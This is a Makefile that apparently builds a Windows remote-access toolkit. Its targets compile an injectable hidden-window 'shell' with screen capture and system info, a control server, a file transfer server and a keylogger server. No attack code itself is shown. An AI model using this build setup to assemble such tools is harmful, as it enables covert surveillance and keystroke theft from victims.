# msys2 -> mingw32 -> make
CC        = gcc
WINDRES   = windres
CFLAGS    = -Wall -Werror -Wextra -static -Os -s


CRY_C = src/cry.c src/cry_socket.c

# shell
SHELL_LIB    = -lws2_32 -lwininet -lgdi32 -lwinmm -lshlwapi -lole32 -loleaut32 -lntdll
SHELL_EXE    = shell
SHELL_C      = src/shell*.c src/info.c src/capture.c $(CRY_C)

#server
SERVER_LIB           = -lws2_32
SERVER_SHELL_EXE     = server
SERVER_SHELL_C       = src/server.c $(CRY_C)
SERVER_SENDRECV_EXE  = sfrf
SERVER_SENDRECV_C    = src/server_sendrecv.c $(CRY_C)
SERVER_KEYLOGGER_EXE = lkl
SERVER_KEYLOGGER_C   = src/server_keylogger.c $(CRY_C)


CFLAGS_NOINJECT = -D DEBUG -D NOINJECT
CFLAGS_DEBUG    = -D DEBUG
CFLAGS_RELEASE  = -fdata-sections -ffunction-sections -Wl,--gc-sections

noinject: $(SHELL_C)
	$(CC) $(CFLAGS) $(CFLAGS_NOINJECT) $(SHELL_C) -o $(SHELL_EXE)_noinject $(SHELL_LIB)

debug: $(SHELL_C)
	$(CC) $(CFLAGS) $(CFLAGS_DEBUG) $(SHELL_C) -o $(SHELL_EXE)_debug $(SHELL_LIB)

release: $(SHELL_C)
	$(WINDRES) res/resources.rc -O coff -o res/resources32.res
	$(CC) $(CFLAGS) $(CFLAGS_RELEASE) $(SHELL_C) -o $(SHELL_EXE)_release32 $(SHELL_LIB) -mwindows res/resources32.res

# build server
server: $(SERVER_SHELL_C)
	$(CC) $(CFLAGS) $(SERVER_SHELL_C) -o $(SERVER_SHELL_EXE) $(SERVER_LIB)

# build recv file send file exe
sfrf: $(SERVER_SENDRECV_C)
	$(CC) $(CFLAGS) $(SERVER_SENDRECV_C) -o $(SERVER_SENDRECV_EXE) $(SERVER_LIB)

# lkl
lkl: $(SERVER_KEYLOGGER_C)
	$(CC) $(CFLAGS) $(SERVER_KEYLOGGER_C) -o $(SERVER_KEYLOGGER_EXE) $(SERVER_LIB)

all: noinject debug release server sfrf lkl

install: *.exe
	cp *.exe bin/.

clean:
	rm src/*.o res/*.res *.exe
